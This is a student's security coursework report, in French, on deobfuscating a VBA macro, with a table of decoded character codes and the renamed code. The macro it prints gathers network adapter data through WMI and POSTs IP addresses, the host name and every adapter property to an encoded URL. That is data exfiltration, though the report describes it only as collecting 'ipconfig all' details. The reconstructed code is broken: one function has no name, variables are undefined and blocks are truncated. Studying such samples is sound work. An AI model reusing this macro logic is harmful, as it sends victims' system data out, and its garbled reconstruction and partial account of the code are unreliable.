Judéaux Idryss étudiant en 2ème année chez Bordeaux Ynov Informatique.

---

Rendu de tp Déobfusquation du code matière Sécurité DENUC Thibault.

---
J'ai repris le code simplifié que vous nous avaient fourni.

Voici tous les changements apportés.(déobfusquation fait sur l' IDE VsCode)

````
tout les chars:
56 == 8
75 == K
76 == L
52 == 4
43 == +
72 == H
57 == 9
113 == q
70 == F
101 == e
104 == h
61 == =
81 == Q
114 == r
88 == X
110 == n
99 == c
105 == i
103 == g
108 == l
73 == I
80 == P
53 == 5
100 == d
109 == m

Chr(Int("&H56")) 
Chr(&H61) 
Chr(Int("&H4e"))
Chr(&H69)
Chr(&H2B)
Chr(&H6C)
Chr(&H64)
Chr(Int("85"))


toute les opérations sur les Chars:
	Chr(4987 - 4935) // 52
	Chr(2936 - 2893) // 43
	Chr(170940 / 2442) // 70
	Chr(1223 - 1110) // 113
	Chr(184600 / 1775) // 104
	Chr(152073 / 2493) // 61
	Chr(2414 - 2338) // 76
	Chr(9876 - 9762) // 114
	Chr(266728 / 3031) // 88
	Chr(675 - 565) // 110
	Chr(718 - 648) // 70
	Chr(9498 - 9399) // 99
	Chr(-2313 + 2418) // 105
	Chr(2184 - 2111) // 73
	Chr(3600 - 3492) // 108
	Chr(242240 / 3028) // 80
	Chr(-2622 + 2725) // 103
	Chr(3356 - 3276) // 80
	Chr(87600 / 1095) // 80
	Chr(130751 / 2467) // 53
	Chr(-1217 + 1317) // 100


ajout de FONCTION:
	function_01 == EvdDqy6OENA
	function_02 == ESOMQRB
	function_03 == vdpz
	function_04 == FLQZEsG
	function_05 == iCq96
	function_06 == ioLNpl

ajout de Const:
	const_01 == RBu4v
	const_02 == rVKP
	const_03 == d1
	const_04 == d2

ajout resultat de FONCTION:
	function_01 == gZIsLqXecQ // resultat_f01
	function_02 == resultat_f01
	function_03 == out // resultat_f03
	function_04 == ..
	function_05 == AoOV0Ml// resultat_f05
	function_06 == LSewU7KJ // resultat_f06

Les variables appelées dans les fonctions For Each:
	For Each oWMIObjEx == For Each FEvar_01
	For Each oWMIProp == For Each FEvar_02

Les variables appelées dans les fonctions For:
	For n == For var_01
	For i == For var_02
	For JtACZ7B0 == For var_03  
	For iter == For var_04

Les variables appelées dans les fonctions If:
	If DjYb == If Ifvar_01
	If m == Ifvar_02
	If fr == Ifvar_03
	If BxtO0 == Ifvar_04
	If oxOXp4 == Ifvar_05


Les appels de variables avec Dim:
	Dim lmlm As Long == varD_01 As Long
	Dim mWDaeVN() == varD_02
	Dim uuu As Long == varD_03 As Long
	Dim i As Byte == varD_04 As Byte
	Dim t As Long == varD_05 As Long
	Dim a As String == varD_06 As String
	Dim a7RjSpybLOH() As String == varD_07() As String
	Dim a2 == varD_08
	Dim w2gjg77jr2() As Byte == varD_09() As Byte
	Dim x3omxY6yvrB(63) As Long == varD_10(63) As Long
	Dim uvv6G4mnZkm(63) As Long == varD_11(63) As Long
	Dim S8XOtKPLsWIl() As String == varD_12() As Long



* Dim instruction pour déterminer le type de données de la variable et d’autres informations,
telles que le code qui peut accéder à la variable.


Valeur sans véritable sens....:
	valeur01 // AjzxVaRR3fu
	valeur02 // V0Kyfluvo
	valeur03 // K6z6Ot0C
	valeur04 // j6KQxT5tJ6n
	valeur05 // AF6q7hHIt
	valeur06 // vbLf
	valeur07 // vbCr
	valeur08 // k9KMgY9gc
	valeur09 // lZZQvk


texte (print) sans véritable sens.....:
	texte01 // gq14V+IwdBHohEVdaK7ySOp3F0yC71Zdqra7UKDjUFxotvVUoqbfVaDy8Vb46X9V
	texte02 // oPhSWbpN2wOqXn0DsED1C7hEUQuwWNMKqFjYRvil0lj6+H1f
	texte03 // gvr2UPAh/Q3iEHADwHXWCvCAzFXwNnBS+l5UCuiNWBWAM+kSgPzVUrhr3RO6X14AoFIURui28Vi6bvsRsEBxCw==


Fonction Set:
	Set kZbQjwYZwI = // varSet_01
	Set dC4BuSkdgWA = // varSet_02
	Set DKr6 = // varSet_03
````

---

Le code avec les changements appliqués.

````
Sub opop()
Dim varD_01 As Long
Debug.Print function_048 & "K" & Chr(Int("&H56")) & Chr(&H61) & Chr(Int("85")) & Chr(Int("&H4e")) & K & Chr(&H69) & Chr(&H2B) & Chr(&H6C) & L & 4 & + & H & 9 & Chr(&H64))
End Sub
Sub WMI()
sWQL = function_04("texte01")
Set varSet01 = GetObject(function_04(+ & q & 9 & Chr(&H34) & Chr(Int("&H56")) & Chr(&H72) & Chr(&H4C) & Chr(Int("&H76")) & Chr(Int("&H64")) & F & Chr(Int("110")) & q & Chr(Int("110")) & Chr(Int("&H4e")) & Chr(Int("&H39")) & Chr(Int("87")) & e & "K" & e & Chr(Int("&H52")) & "Q" & Chr(Int("56")) & h & Chr(Int("121")) & Chr(&H5A) & Chr(Int("49")) & Chr(Int("48")) & =))
Set varSet02 = varSet01.ExecQuery(sWQL)
Set varSet03 = CreateObject(function_04(Q & L & Chr(Int("99")) & r & X & "I" & Chr(&H68) & + & "H" & Chr(Int("&H30")) & "C" & "o" & Chr(Int("&H76")) & n & F & c & c & Chr(Int("114")) & i & I & Chr(Int("86")) & g & Chr(Int("68")) & 4 & Chr(Int("65")) & l & Chr(Int("107")) & Chr(Int("&H3d"))))
URL = function_04("texte02")
Debug.Print URL
Dim varD_02()
For Each Fevar_01 In varSet02
If Not IsNull(Fevar_01.IPAddress) Then
Debug.Print I & P & Chr(Int("58")); Fevar_01.IPAddress(0)
varSet03.Open "P" & Chr(Int("&H4f")) & Chr(Int("83")) & Chr(&H54), URL, True
varSet03.setRequestHeader function_04(g & P & "v" & Chr(Int("&H31")) & Chr(&H55) & Chr(Int("113")) & Chr(Int("&H69")) & P & Chr(&H34) & Chr(Int("&H6c")) & Chr(&H54) & q & + & Chr(&H6C) & 5 & d), function_04("texte03")
varSet03.send Fevar_01.IPAddress(0)
Debug.Print function_04(m & Chr(Int("&H4f")) & Chr(Int("&H48")) & "T" & Chr(&H58) & Chr(Int("&H66")) & Chr(Int("67")) & Chr(&H45) & Chr(Int("&H30")) & Chr(Int("&H56")) & Chr(&H58) & Chr(Int("52")) & Chr(Int("43")) & Chr(Int("&H6e")) & Chr(Int("49")) & Chr(Int("&H4d"))); Fevar_01.DNSHostName
For Each Fevar_02 In Fevar_01.Properties_
If IsArray(Fevar_02.Value) Then
For var_01 = LBound(Fevar_02.Value) To UBound(Fevar_02.Value)
Debug.Print Fevar_02.Name & Chr(Int("40")) & var_01 & Chr(&H29), Fevar_02.Value(n)
varSet03.Open "P" & Chr(Int("&H4f")) & Chr(Int("83")) & Chr(&H54), URL, True
varSet03.setRequestHeader function_04(g & P & "v" & Chr(Int("&H31")) & Chr(&H55) & Chr(Int("113")) & Chr(Int("&H69")) & P & Chr(&H34) & Chr(Int("&H6c")) & Chr(&H54) & q & + & Chr(&H6C) & 5 & d), function_04("texte03")
varSet03.send Fevar_02.Value(n)
Next
Else
Debug.Print Fevar_02.Name, Fevar_02.Value
varSet03.Open "P" & Chr(Int("&H4f")) & Chr(Int("83")) & Chr(&H54), URL, True
varSet03.setRequestHeader function_04(g & P & "v" & Chr(Int("&H31")) & Chr(&H55) & Chr(Int("113")) & Chr(Int("&H69")) & P & Chr(&H34) & Chr(Int("&H6c")) & Chr(&H54) & q & + & Chr(&H6C) & 5 & d), function_04("texte03")
varSet03.send Fevar_02.Value
End If
Next
End If
Next
End Sub
Sub fizf()
Dim varD_03 As Long
Debug.Print function_04(Chr(Int("&H38")) & K & "1" & Chr(Int("&H2f")) & Chr(&H56) & Chr(&H39) & q & Chr(&H37) & Chr(Int("&H2b")) & Chr(&H6C) & Chr(Int("98")) & Chr(Int("54")) & Chr(Int("&H2b")) & n & Chr(&H39) & Chr(Int("100")))
End Sub
Public Function (ByVal resultat_f01 As Long, ByVal Ifvar_01 As Byte) As Long
function_01 = resultat_f01
If Ifvar_01 > 0 Then
If resultat_f01 > 0 Then
function_01 = Int(function_01 / (2 ^ Ifvar_01))
Else
If Ifvar_01> 31 Then
function_01 = 0
Else
function_01 = function_01 And &H7FFFFFFF
function_01 = Int(function_01 / (2 ^ Ifvar_01))
function_01 = function_01 Or 2 ^ (31 - Ifvar_01)
End If
End If
End If
End Function
Public Function function_02(ByVal resultat_f01 As Long, ByVal Ifvar_01 As Byte) As Long
function_02 = resultat_f01
If Ifvar_01 > 0 Then
Dim varD_04 As Byte
Dim Ifvar_02 As Long
For var_02 = 1 To Ifvar_01
Ifvar_02 = function_02 And &H40000000
function_02 = (function_02 And &H3FFFFFFF) * 2
If Ifvar_02 <> 0 Then
function_02 = function_02 Or &H80000000
End If
Next var_02
End If
End Function
Public Function function_03(ByVal valeur09 As Long) As Long
Const const_01 As Long = 5570645
Const const_02 As Long = 52428
Const const_03 = 7
Const const_04 = 14
Dim varD_05 As Long, u, resultat_f03 As Long
varD_05 = (valeur09 Xor function_01(valeur09, const_04)) And const_02
u = valeur09 Xor varD_05 Xor function_02(varD_05, const_04)
varD_05 = (u Xor function_01(u, const_03)) And const_01
resultat_f03 = (u Xor varD_05 Xor function_02(varD_05, const_03))
function_03 = resultat_f03
End Function
Public Function function_06(ByRef valeur05() As Byte) As String
Dim var_02, Ifvar_03, valeur08, raw As Long
Dim varD_06 As String, b As String, c As String, d As String
Dim resultat_f06 As String
Dim varD_07() As String
Dim varD_08, b2 As String
resultat_f06 = ""
For var_02 = 0 To (UBound(valeur05) / 4 + 1)
Ifvar_03 = var_02 * 4
If Ifvar_03 > UBound(valeur05) Then
Exit For
End If
valeur08 = 0
valeur08 = valeur08 Or function_02(valeur05(Ifvar_03 + 3), 24)
valeur08 = valeur08 Or function_02(valeur05(Ifvar_03 + 2), 16)
valeur08 = valeur08 Or function_02(valeur05(Ifvar_03 + 1), 8)
valeur08 = valeur08 Or valeur05(Ifvar_03 + 0)
raw = function_03(valeur08)
varD_06 = Chr(function_01((raw And &HFF000000), 24))
b = Chr(function_01((raw And 16711680), 16))
c = Chr(function_01((raw And 65280), 8))
d = Chr(function_01((raw And 255), 0))
resultat_f06 = resultat_f06 + d + c + b + varD_06
Next var_02
function_06 = resultat_f06
End Function
Public Function function_04(valeur05 As String) As String
Dim varD_09() As Byte, valeur04() As Byte, arrayByte3(255) As Byte
Dim varD_10(63) As Long, arrayLong5(63) As Long
Dim varD_11(63) As Long, valeur03 As Long
Dim Ifvar_04 As Integer, var_04 As Long, valeur02 As Long, var_03 As Long
Dim resultat_f06 As String
valeur05 = Replace(valeur05, valeur07, vbNullString)
valeur05 = Replace(valeur05, valeur06, vbNullString)
var_03 = Len(valeur05) Mod 4
If InStrRev(valeur05, "==") Then
Ifvar_04 = 2
ElseIf InStrRev(valeur05, "" + "=") Then
Ifvar_04 = 1
End If
For var_03 = 0 To 255
Select Case var_03
Case 65 To 90
arrayByte3(var_03) = var_03 - 65
Case 97 To 122
arrayByte3(var_03) = var_03 - 71
Case 48 To 57
arrayByte3(var_03) = var_03 + 4
Case 43
arrayByte3(var_03) = 62
Case 47
arrayByte3(var_03) = 63
End Select
Next var_03
For var_03 = 0 To 63
varD_10(var_03) = var_03 * 64
arrayLong5(var_03) = var_03 * 4096
varD_11(var_03) = var_03 * 262144
Next var_03
valeur04 = StrConv(valeur05, vbFromUnicode)
ReDim varD_09((((UBound(valeur04) + 1) \ 4) * 3) - 1)
For var_04 = 0 To UBound(valeur04) Step 4
valeur03 = varD_11(arrayByte3(valeur04(var_04))) + arrayLong5(arrayByte3(valeur04(var_04 + 1))) + varD_10(arrayByte3(valeur04(var_04 + 2))) + arrayByte3(valeur04(var_04 + 3))
var_03 = valeur03 And 16711680
varD_09(valeur02) = var_03 \ 65536
var_03 = valeur03 And 65280
varD_09(valeur02 + 1) = var_03 \ 256
varD_09(valeur02 + 2) = valeur03 And 255
valeur02 = valeur02 + 3
Next var_04
resultat_f06 = StrConv(varD_09, vbUnicode)
If Ifvar_04 Then resultat_f06 = Left$(resultat_f06, Len(resultat_f06) - Ifvar_04)
function_04 = function_06(StrConv(resultat_f06, vbFromUnicode))
function_04 = function_05(function_04, "~")
End Function
Function function_05(resultat_f05 As String, valeur01 As String) As String
Dim Ifvar_05 As Long
Dim varD_12() As String
varD_12 = Split(resultat_f05, valeur01)
Ifvar_05 = UBound(varD_12, 1)
If Ifvar_05 <> 0 Then
resultat_f05 = Left$(resultat_f05, Len(resultat_f05) - Ifvar_05)
End If
function_05 = resultat_f05
End Function
````

Dorénavant je supprime toutes les lignes de code que je considère comme secondaires pour en garder que l'essentiel.

````
Sub opop()

End Sub

Sub WMI()

sWQL = function_04("texte01")

Set varSet01 = GetObject(function_04(+ & q & 9 & Chr(&H34) & Chr(Int("&H56")) & Chr(&H72) & Chr(&H4C) & Chr(Int("&H76")) & Chr(Int("&H64")) & F & Chr(Int("110")) & q & Chr(Int("110")) & Chr(Int("&H4e")) & Chr(Int("&H39")) & Chr(Int("87")) & e & "K" & e & Chr(Int("&H52")) & "Q" & Chr(Int("56")) & h & Chr(Int("121")) & Chr(&H5A) & Chr(Int("49")) & Chr(Int("48")) & =))
Set varSet02 = varSet01.ExecQuery(sWQL)
Set varSet03 = CreateObject(function_04(Q & L & Chr(Int("99")) & r & X & "I" & Chr(&H68) & + & "H" & Chr(Int("&H30")) & "C" & "o" & Chr(Int("&H76")) & n & F & c & c & Chr(Int("114")) & i & I & Chr(Int("86")) & g & Chr(Int("68")) & 4 & Chr(Int("65")) & l & Chr(Int("107")) & Chr(Int("&H3d"))))

URL = function_04("texte02")

Debug.Print URL
Dim varD_02()
For Each Fevar_01 In varSet02
    If Not IsNull(Fevar_01.IPAddress) Then
    Debug.Print I & P & Chr(Int("58")); Fevar_01.IPAddress(0)

varSet03.Open "P" & Chr(Int("&H4f")) & Chr(Int("83")) & Chr(&H54), URL, True
varSet03.setRequestHeader function_04(g & P & "v" & Chr(Int("&H31")) & Chr(&H55) & Chr(Int("113")) & Chr(Int("&H69")) & P & Chr(&H34) & Chr(Int("&H6c")) & Chr(&H54) & q & + & Chr(&H6C) & 5 & d), function_04("texte03")
varSet03.send Fevar_01.IPAddress(0)

Debug.Print function_04(m & Chr(Int("&H4f")) & Chr(Int("&H48")) & "T" & Chr(&H58) & Chr(Int("&H66")) & Chr(Int("67")) & Chr(&H45) & Chr(Int("&H30")) & Chr(Int("&H56")) & Chr(&H58) & Chr(Int("52")) & Chr(Int("43")) & Chr(Int("&H6e")) & Chr(Int("49")) & Chr(Int("&H4d"))); Fevar_01.DNSHostName
For Each Fevar_02 In Fevar_01.Properties_
    If IsArray(Fevar_02.Value) Then
    varSet03.Open "P" & Chr(Int("&H4f")) & Chr(Int("83")) & Chr(&H54), URL, True
Debug.Print Fevar_02.Name, Fevar_02.Value




Public Function (ByVal resultat_f01 As Long, ByVal Ifvar_01 As Byte) As Long
    function_01 = resultat_f01
        If Ifvar_01 > 0 Then
        If resultat_f01 > 0 Then
            function_01 = Int(function_01 / (2 ^ Ifvar_01))
        Else
            If Ifvar_01> 31 Then
            function_01 = 0
        Else
            function_01 = function_01 And &H7FFFFFFF
            function_01 = Int(function_01 / (2 ^ Ifvar_01))
            function_01 = function_01 Or 2 ^ (31 - Ifvar_01)
            End If
        End If
        End If
End Function

Public Function function_02(ByVal resultat_f01 As Long, ByVal Ifvar_01 As Byte) As Long
    function_02 = resultat_f01
        If Ifvar_01 > 0 Then
    Dim varD_04 As Byte
    Dim Ifvar_02 As Long
        For var_02 = 1 To Ifvar_01
            Ifvar_02 = function_02 And &H40000000
                function_02 = (function_02 And &H3FFFFFFF) * 2
        If Ifvar_02 <> 0 Then
    function_02 = function_02 Or &H80000000
        End If
    Next var_02
            End If
End Function


Function function_05(resultat_f05 As String, valeur01 As String) As String
    Dim Ifvar_05 As Long
    Dim varD_12() As String
    varD_12 = Split(resultat_f05, valeur01)
        Ifvar_05 = UBound(varD_12, 1)
        If Ifvar_05 <> 0 Then
            resultat_f05 = Left$(resultat_f05, Len(resultat_f05) - Ifvar_05)
        End If
    function_05 = resultat_f05
End Function
````
L'objectif du code est de faire un ipconfig all sur notre ordinateur récupérer toutes les caractéristiques des connexions réseaux : adresse IP, adresse MAC...

Quelque exemple de bout de code pour illustrer mon propos..
````
Fevar_01.IPAddress(0) , Fevar_01.DNSHostName ,  URL, True , Debug.Print URL , URL = function_04("texte02") ,In Fevar_01.Properties_
````

Cependant je n'ai pas réussi à faire fonctionner mon code et à traduire les char(int).